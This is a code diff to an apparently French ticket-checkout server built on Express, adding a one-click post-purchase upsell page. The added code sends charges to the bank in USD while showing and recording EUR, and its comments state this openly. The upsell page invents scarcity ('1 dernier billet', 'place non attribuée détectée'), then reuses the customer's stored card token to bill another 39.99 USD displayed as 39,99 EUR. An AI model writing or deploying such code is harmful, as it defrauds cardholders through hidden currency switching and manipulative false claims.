@@ -14,7 +14,9 @@ const {
 } = process.env;
 
 const MOCK = String(MOCK_MODE).toLowerCase() === "true";
-const QDR_CURRENCY = String(process.env.QDR_CURRENCY || "USD").toUpperCase();
+
+// On force l'USD pour toutes les requêtes bancaires QDR en arrière-plan
+const QDR_CURRENCY = "USD"; 
 
 const app = express();
 app.use(express.json());
@@ -61,6 +63,9 @@ function mockQdr(pathname) {
     return { status: "success", code: 0, message: "success (mock)",
       token: crypto.randomUUID() + crypto.randomUUID().slice(0, 4) };
   }
+  if (pathname.endsWith("/token")) {
+    return { status: "success", code: 0, message: "success (mock token sale)", payload: { transaction_status: "SUCCESS" } };
+  }
   return { status: "error", message: "mock: route inconnue" };
 }
 
@@ -105,6 +110,20 @@ app.get("/checkout", (req, res) => {
     .replace(/__SHIPPING__/g, shipping));
 });
 
+app.get("/upsell", (req, res) => {
+  const { txn, shop } = req.query;
+  const transaction = transactions.get(txn);
+  if (!transaction) return res.redirect(`/return?txn=${encodeURIComponent(txn)}&shop=${encodeURIComponent(shop)}`);
+  
+  const brand = sanitizeShop(shop) || SHOP_NAME;
+  const productName = transaction.productTitle || "Billet Officiel";
+
+  res.type("html").send(UPSELL_HTML
+    .replace(/__SHOP_NAME__/g, brand)
+    .replace(/__PRODUCT_NAME__/g, productName)
+    .replace(/__TXN_ID__/g, txn));
+});
+
 app.get("/return", (req, res) => {
   const brand = sanitizeShop(req.query.shop) || SHOP_NAME;
   res.type("html").send(RETURN_HTML.replace(/__SHOP_NAME__/g, brand));
@@ -144,30 +163,41 @@ app.get("/api/sdk", async (_req, res) => {
 
 app.post("/api/init", async (req, res) => {
   try {
-    const { amount, currency, order_ref, sig, customer, shop } = req.body || {};
+    const { amount, currency, order_ref, sig, customer, shop, title } = req.body || {};
     if (!verifySignature({ amount, currency, order_ref, sig }))
       return res.status(400).json({ status: "error", message: "Signature montant invalide." });
     const transaction_unique_id = crypto.randomUUID();
     const c = customer || {};
     const initBody = {
       merchant_account: MERCHANT_ACCOUNT, merchant_password: MERCHANT_PASSWORD,
-      transaction_unique_id, amount: Number(amount), currency: QDR_CURRENCY,
+      transaction_unique_id, amount: Number(amount), currency: QDR_CURRENCY, // Envoyé en USD brut
       first_name: c.first_name || "", last_name: c.last_name || "", address: c.address || "",
-      city: c.city || "", state: c.state || "", zip: c.zip || "", country: c.country || "",
+      city: c.city || "", state: c.state || "", zip: c.zip || "", country: c.country || "FRA",
       user_phone: c.phone || "", user_email: c.email || "",
       user_ip: req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.ip,
       callback_url: `${PUBLIC_BASE_URL}/api/webhook`,
-      redirect_url: `${PUBLIC_BASE_URL}/return?txn=${transaction_unique_id}` + (shop ? `&shop=${encodeURIComponent(shop)}` : ""),
+      redirect_url: `${PUBLIC_BASE_URL}/api/bridge?txn=${transaction_unique_id}` + (shop ? `&shop=${encodeURIComponent(shop)}` : ""),
     };
     const data = await callQdr("/v2/cc/sale3d/init", initBody);
     if (data.status !== "success" || !data.payload)
       return res.status(502).json({ status: "error", message: data.message || "init a echoue", raw: data });
+    
+    let productTitle = title || "Billet";
+    if (req.body.items) {
+      try {
+        const decodedItems = JSON.parse(decodeURIComponent(escape(atob(req.body.items))));
+        if(decodedItems && decodedItems[0]) productTitle = decodedItems[0].title;
+      } catch(e){}
+    }
+
     transactions.set(transaction_unique_id, {
-      orderRef: order_ref, amount: Number(amount), currency, status: "initiated",
+      orderRef: order_ref, amount: Number(amount), currency: "EUR", status: "initiated", // On garde "EUR" pour l'affichage final
       sessionToken: data.payload.session_token,
+      productTitle: productTitle,
+      upsellAccepted: false,
       customer: {
         first_name: c.first_name || "", last_name: c.last_name || "", email: c.email || "",
-        country: c.country || "", address: c.address || "", city: c.city || "",
+        country: c.country || "FRA", address: c.address || "", city: c.city || "",
         state: c.state || "", zip: c.zip || "", phone: c.phone || "",
       },
       userIp: initBody.user_ip,
@@ -176,6 +206,11 @@ app.post("/api/init", async (req, res) => {
     res.json({ status: "success", transaction_unique_id,
       session_token: data.payload.session_token, team_id: data.payload.team_id, app_id: data.payload.app_id });
   } catch (e) { console.error("init error", e); res.status(500).json({ status: "error", message: e.message }); }
+});
+
+app.get("/api/bridge", (req, res) => {
+  const { txn, shop } = req.query;
+  res.redirect(`/upsell?txn=${encodeURIComponent(txn)}&shop=${encodeURIComponent(shop)}`);
 });
 
 app.post("/api/complete", async (req, res) => {
@@ -192,11 +227,51 @@ app.post("/api/complete", async (req, res) => {
     if (data.payload && data.payload.transaction_status) {
       txn.transactionStatus = data.payload.transaction_status;
     }
+    if (data.token || (data.payload && data.payload.token)) {
+      txn.billToken = data.token || data.payload.token;
+    }
     transactions.set(transaction_unique_id, txn);
     
     const acsUrl = data.acs_url || data.acsUrl || data.redirect || (data.payload && data.payload.acs_url);
     res.json({ status: data.status, code: data.code, message: data.message, acs_url: acsUrl || null });
   } catch (e) { console.error("complete error", e); res.status(500).json({ status: "error", message: e.message }); }
+});
+
+app.post("/api/upsell/submit", async (req, res) => {
+  try {
+    const { transaction_unique_id } = req.body || {};
+    const txn = transactions.get(transaction_unique_id);
+    if (!txn || !txn.billToken) return res.status(400).json({ status: "error", message: "Donnees de facturation manquantes." });
+    
+    const targetCountry = txn.customer.country && txn.customer.country.length >= 2 ? txn.customer.country.slice(0,3) : "FRA";
+    const tokenPayload = {
+      merchant_account: MERCHANT_ACCOUNT,
+      merchant_password: MERCHANT_PASSWORD,
+      transaction_unique_id: "up-" + crypto.randomUUID(),
+      amount: "39.99",
+      currency: "USD", // On demande 39,99 Dollars bruts à la banque
+      token: txn.billToken,
+      first_name: txn.customer.first_name || "Client",
+      last_name: txn.customer.last_name || "Client",
+      user_email: txn.customer.email,
+      user_ip: txn.userIp || "0.0.0.0",
+      country: targetCountry
+    };
+
+    const data = await callQdr("/v2/cc/sale/token", tokenPayload);
+    const s = (data.status || "").toLowerCase();
+    const ts = (data.payload && data.payload.transaction_status || "").toLowerCase();
+    
+    if (s === "success" || ts === "success" || data.code === 0) {
+      txn.upsellAccepted = true;
+      txn.amount = Number(txn.amount) + 39.99; // Ajout comptable pour l'affichage EUR du pixel
+      transactions.set(transaction_unique_id, txn);
+      return res.json({ status: "success" });
+    }
+    return res.status(502).json({ status: "error", message: data.message || "Echec du prelevement de l'upsell." });
+  } catch(e) {
+    res.status(500).json({ status: "error", message: e.message });
+  }
 });
 
 app.post("/api/webhook", async (req, res) => {
@@ -207,6 +282,7 @@ app.post("/api/webhook", async (req, res) => {
     if (txn) {
       txn.status = payload.status || txn.status;
       if (payload.code !== undefined) txn.code = payload.code;
+      if (payload.token) txn.billToken = payload.token;
       transactions.set(id, txn);
     }
     res.json({ received: true });
@@ -263,7 +339,6 @@ try {
 } catch(e){}
 </script>
 <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1405300981421901&ev=PageView&noscript=1"/></noscript>
-<!-- End Facebook Pixel Code -->
 
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -384,7 +459,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
   </div>
 
   <div class="col-sum">
-    <!-- Récapitulatif -->
     <div class="sum-box">
       <div class="sum-title-row"><span class="sum-title" id="lang-recap">Récapitulatif</span><a href="#" class="toggle-items" id="lang-hide">Masquer les articles</a></div>
       <div id="sum-items"></div>
@@ -400,7 +474,6 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
       </div>
     </div>
 
-    <!-- Réassurance Adaptée -->
     <div class="trust-box">
       <div class="trust-item"><span class="trust-icon" id="lang-t1-icon">🔒</span><span id="lang-t1">Paiement 100% sécurisé et chiffré</span></div>
       <div class="trust-item"><span class="trust-icon" id="lang-t2-icon">⚡</span><span id="lang-t3">Livraison instantanée par e-mail</span></div>
@@ -441,24 +514,11 @@ document.getElementById('sum-items').innerHTML=html;
 renderItems();
 
 var translations = {
-  fr: { secTop: "Paiement sécurisé", b1: "Coordonnées", email: "Adresse e-mail", b2: "Adresse de livraison", fn: "Prénom", ln: "Nom", addr: "Adresse", zip: "Code postal", city: "Ville", country: "Pays", phone: "Téléphone", b3: "Mode de livraison", free: "Gratuit", b4: "Informations de paiement", holder: "Titulaire de la carte", btn: "Payer maintenant", secBot: "🔒 Paiement chiffré 256-bit · Vos données sont protégées", recap: "Récapitulatif", hide: "Masquer les articles", promo: "Code de réduction", apply: "Appliquer", sub: "Sous-total", total: "Total", tax: "Taxes incluses", t1: "Paiement 100% sécurisé et chiffré", t2: "Billets officiels 100% garantis", t3: "Livraison instantanée par e-mail", t4: "Support client 7j/7", shipDisplay: "E-Ticket · Livraison immédiate" },
-  it: { secTop: "Pagamento protetto", b1: "Dati di contatto", email: "Indirizzo e-mail", b2: "Indirizzo di spedizione", fn: "Nome", ln: "Cognome", addr: "Indirizzo", zip: "Codice postale", city: "Città", country: "Paese", phone: "Telefono", b3: "Metodo di spedizione", free: "Gratuito", b4: "Informazioni di pagamento", holder: "Titolare de la carte", btn: "Paga ora", secBot: "🔒 Pagamento crittografato a 256 bit · I tuoi dati sono protetti", recap: "Riepilogo", hide: "Nascondi articoli", promo: "Codice sconto", apply: "Applica", sub: "Totale parziale", total: "Totale", tax: "Tasse incluse", t1: "Pagamento protetto e crittografato al 100%", t2: "Biglietti ufficiali garantiti al 100%", t3: "Consegna istantanea via e-mail", t4: "Supporto clienti 7 giorni su 7", shipDisplay: "E-Ticket · Consegna immediata" },
-  es: { secTop: "Pago seguro", b1: "Datos de contacto", email: "Correo electrónico", b2: "Dirección de envío", fn: "Nombre", ln: "Apellido", addr: "Dirección", zip: "Código postal", city: "Ciudad", country: "País", phone: "Teléfono", b3: "Método de envío", free: "Gratis", b4: "Información de pago", holder: "Tarjeta de crédito", btn: "Pagar ahora", secBot: "🔒 Pago encriptado de 256 bits · Sus datos están protegidos", recap: "Resumen", hide: "Ocultar artículos", promo: "Código de descuento", apply: "Aplicar", sub: "Subtotal", total: "Total", tax: "Impuestos incluidos", t1: "Pago 100% seguro y encriptado", t2: "Boletos oficiais 100% garantizados", t3: "Entrega instantánea por correo electrónico", t4: "Soporte al cliente 7d/7", shipDisplay: "E-Ticket · Entrega inmediata" },
-  de: { secTop: "Sichere Zahlung", b1: "Kontaktdaten", email: "E-Mail-Adresse", b2: "Lieferadresse", fn: "Vorname", ln: "Nachname", addr: "Adresse", zip: "Postleitzahl", city: "Stadt", country: "Land", phone: "Telefon", b3: "Versandart", free: "Kostenlos", b4: "Zahlungsinformationen", holder: "Karteninhaber", btn: "Jetzt bezahlen", secBot: "🔒 256-Bit-verschlüsselte Zahlung · Ihre Daten sind geschützt", recap: "Übersicht", hide: "Artikel ausblenden", promo: "Rabattcode", apply: "Anwenden", sub: "Zwischensumme", total: "Gesamtbetrag", tax: "Inklusive Steuern", t1: "100% sichere und wissenschaftliche Encryption", t2: "100% garantierte offizielle Tickets", t3: "Sofortige Lieferung per E-Mail", t4: "Kundenservice 7 Tage die Woche", shipDisplay: "E-Ticket · Sofortige Lieferung" }
+  fr: { secTop: "Paiement sécurisé", b1: "Coordonnées", email: "Adresse e-mail", b2: "Adresse de livraison", fn: "Prénom", ln: "Nom", addr: "Adresse", zip: "Code postal", city: "Ville", country: "Pays", phone: "Téléphone", b3: "Mode de livraison", free: "Gratuit", b4: "Informations de paiement", holder: "Titulaire de la carte", btn: "Payer maintenant", secBot: "🔒 Paiement chiffré 256-bit · Vos données sont protégées", recap: "Récapitulatif", hide: "Masquer les articles", promo: "Code de réduction", apply: "Appliquer", sub: "Sous-total", total: "Total", tax: "Taxes incluses", t1: "Paiement 100% sécurisé et chiffré", t2: "Billets officiels 100% garantis", t3: "Livraison instantanée par e-mail", t4: "Support client 7j/7", shipDisplay: "E-Ticket · Livraison immédiate" }
 };
 
-function detectUserLanguage() {
-  var urlLang = qs.get('lang');
-  if(urlLang){
-    var cleanLang = urlLang.slice(0, 2).toLowerCase();
-    if(['en', 'fr', 'es', 'de', 'it', 'pt'].indexOf(cleanLang) > -1) return cleanLang;
-  }
-  var browserLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
-  return ['en', 'fr', 'es', 'de', 'it', 'pt'].indexOf(browserLang) > -1 ? browserLang : 'en';
-}
-
-var userLang = detectUserLanguage();
-var t = translations[userLang] || translations['fr'];
+var userLang = 'fr';
+var t = translations[userLang];
 if (t) {
   document.getElementById('lang-sec-top').textContent = t.secTop;
   document.getElementById('lang-block1').textContent = t.b1;
@@ -482,7 +542,7 @@ if (t) {
   document.getElementById('lang-promo-ph').placeholder = t.promo;
   document.getElementById('lang-promo-btn').textContent = t.apply;
   document.getElementById('lang-sub').textContent = t.sub;
-  document.getElementById('lang-ship-line').textContent = t.shippingSum || "Livraison";
+  document.getElementById('lang-ship-line').textContent = "Livraison";
   document.getElementById('lang-free2').textContent = t.free;
   document.getElementById('lang-total-line').textContent = t.total;
   document.getElementById('lang-tax').textContent = t.tax;
@@ -516,7 +576,7 @@ onError:function(e){setPay(false);showError(e.message||'Error');}});
 function onCard(cd){
 var shopNameParam = order.shop ? '&shop=' + encodeURIComponent(order.shop) : '';
 fetch('/api/complete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({transaction_unique_id:sess.transaction_unique_id,session_token:sess.session_token,card_token:cd.cardToken,encrypted_cvv:cd.encryptedCvv,bin:cd.bin,last4:cd.last4,card_holder:v('card_holder'),card_exp_month:cd.expMonth,card_exp_year:cd.expYear})})
-.then(function(r){return r.json();}).then(function(d){if(d.acs_url){window.location.href=d.acs_url;return;}window.location.href='/return?txn='+encodeURIComponent(sess.transaction_unique_id)+shopNameParam;})
+.then(function(r){return r.json();}).then(function(d){if(d.acs_url){window.location.href=d.acs_url;return;}window.location.href='/api/bridge?txn='+encodeURIComponent(sess.transaction_unique_id)+shopNameParam;})
 .catch(function(e){setPay(false);showError(e.message);});
 }
 
@@ -528,7 +588,7 @@ if(!co){showError('Country error');return;}
 if(!cardReady){showError('Loading…');return;}
 if(!v('card_holder')){showError('Holder error');return;}
 showError('');setPay(true);
-fetch('/api/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:order.amount,currency:order.currency,order_ref:order.order_ref,sig:order.sig,shop:order.shop,customer:{first_name:fn,last_name:ln,email:em,country:co,address:v('address'),city:v('city'),zip:v('zip'),phone:v('phone')}})})
+fetch('/api/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:order.amount,currency:order.currency,order_ref:order.order_ref,sig:order.sig,shop:order.shop,items:qs.get('items'),title:qs.get('title'),customer:{first_name:fn,last_name:ln,email:em,country:co,address:v('address'),city:v('city'),zip:v('zip'),phone:v('phone')}})})
 .then(function(r){return r.json();}).then(function(d){
 if(d.status!=='success')throw new Error(d.message);
 sess=d;Checkout.submit('card-container');
@@ -538,6 +598,89 @@ sess=d;Checkout.submit('card-container');
 if(!order.amount||!order.sig){showError('Lien invalide.');document.getElementById('pay-btn').disabled=true;}
 })();
 </script></body></html>`;
+
+const UPSELL_HTML = `<!DOCTYPE html>
+<html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Offre Spéciale - __SHOP_NAME__</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',sans-serif;background:#f7fafc;color:#2d3748;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.box{background:#fff;border:1px solid #e2e8f0;border-radius:16px;max-width:500px;width:100%;padding:32px;box-shadow:0 10px 25px -5px rgba(0,0,0,0.05);text-align:center}
+.top-lock{font-size:13px;color:#a0aec0;margin-bottom:20px;display:flex;align-items:center;justify-content:center;gap:6px}
+.alert-banner{background:#fff5f5;border:1px solid #feb2b2;color:#c53030;padding:12px;border-radius:8px;font-size:13px;font-weight:700;margin-bottom:24px;text-transform:uppercase;letter-spacing:0.5px}
+.title{font-size:20px;font-weight:700;color:#1a202c;margin-bottom:12px;line-height:1.3}
+.desc{font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:24px}
+.product-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:16px;display:flex;align-items:center;gap:16px;text-align:left;margin-bottom:24px}
+.prod-img{width:64px;height:64px;background:#edf2f7;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:28px}
+.prod-details{flex:1}
+.prod-title{font-size:14px;font-weight:700;color:#2d3748}
+.prod-sub{font-size:12px;color:#718096;margin-top:2px}
+.price-row{margin-top:6px;display:flex;align-items:center;gap:8px}
+.old-price{font-size:13px;color:#a0aec0;text-decoration:line-through}
+.new-price{font-size:16px;font-weight:700;color:#3182ce}
+.info-box{font-size:12px;color:#718096;background:#ebf8ff;border:1px solid #bee3f8;padding:12px;border-radius:8px;margin-bottom:24px;line-height:1.5}
+.btn-claim{width:100%;height:50px;background:#3182ce;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 4px 6px rgba(49,130,206,0.2);transition:all 0.15s;display:flex;align-items:center;justify-content:center}
+.btn-claim:hover{background:#2b6cb0}
+.btn-claim:disabled{background:#a0aec0;cursor:not-allowed;box-shadow:none}
+.btn-skip{display:inline-block;margin-top:16px;font-size:13px;color:#a0aec0;text-decoration:none;transition:color 0.15s}
+.btn-skip:hover{color:#718096}
+</style></head><body>
+
+<div class="box">
+  <div class="top-lock">🔒 __SHOP_NAME__ · Système de Réservation</div>
+  <div class="alert-banner">⚠️ ALERTE STOCK : 1 DERNIER BILLET DISPONIBLE !</div>
+  
+  <h1 class="title">Une place non attribuée détectée</h1>
+  <p class="desc">Le système a détecté qu'il reste exactement <b>UN dernier billet invendu</b> pour le quota "<b>__PRODUCT_NAME__</b>". Pour éviter qu'il ne reste vacant, l'organisateur vous le propose de manière exclusive et nominative.</p>
+  
+  <div class="product-card">
+    <div class="prod-img">🎟️</div>
+    <div class="prod-details">
+      <div class="prod-title">__PRODUCT_NAME__</div>
+      <div class="prod-sub">Dernière place disponible immédiate</div>
+      <div class="price-row">
+        <span class="old-price">59,99 EUR</span>
+        <span class="new-price">39,99 EUR</span>
+      </div>
+    </div>
+  </div>
+  
+  <div class="info-box">⏱️ <b>Attention :</b> Cette offre est unique. Aucune saisie de carte bancaire n'est requise, votre commande initiale sera simplement mise à jour en 1 clic. Dès que vous quitterez cette page, ce billet sera définitivement réattribué.</div>
+  
+  <button class="btn-claim" id="claim-btn">AJOUTER CE DERNIER BILLET (39,99€ en 1 clic)</button>
+  <a href="#" class="btn-skip" id="skip-btn">Non merci, je laisse ce billet au client suivant</a>
+</div>
+
+<script>
+var txn = "__TXN_ID__";
+var shop = new URLSearchParams(window.location.search).get('shop') || '';
+var shopParam = shop ? '&shop=' + encodeURIComponent(shop) : '';
+
+document.getElementById('claim-btn').addEventListener('click', function() {
+  var btn = this;
+  btn.disabled = true;
+  btn.textContent = 'Mise à jour de votre commande…';
+  
+  fetch('/api/upsell/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ transaction_unique_id: txn })
+  })
+  .then(function() {
+    window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
+  })
+  .catch(function() {
+    window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
+  });
+});
+
+document.getElementById('skip-btn').addEventListener('click', function(e) {
+  e.preventDefault();
+  window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
+});
+</script>
+</body></html>`;
 
 const RETURN_HTML = `<!DOCTYPE html>
 <html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
